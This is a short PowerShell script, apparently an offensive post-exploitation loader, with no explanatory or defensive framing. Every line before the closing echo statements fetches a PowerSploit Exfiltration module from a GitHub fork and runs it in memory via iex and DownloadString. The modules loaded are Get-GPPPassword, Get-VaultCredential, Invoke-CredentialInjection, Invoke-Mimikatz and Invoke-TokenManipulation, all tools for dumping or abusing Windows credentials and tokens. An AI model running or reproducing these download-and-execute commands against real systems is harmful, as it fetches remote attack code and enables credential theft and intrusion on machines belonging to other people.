iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Get-VaultCredential.ps1')
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Invoke-CredentialInjection.ps1')
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1')
echo "Imported :"
echo "  Get-GPPPassword"
echo "  Get-VaultCredential"
echo "  Invoke-CredentialInjection"
echo "  Invoke-Mimikatz"
echo "  Invoke-TokenManipulation"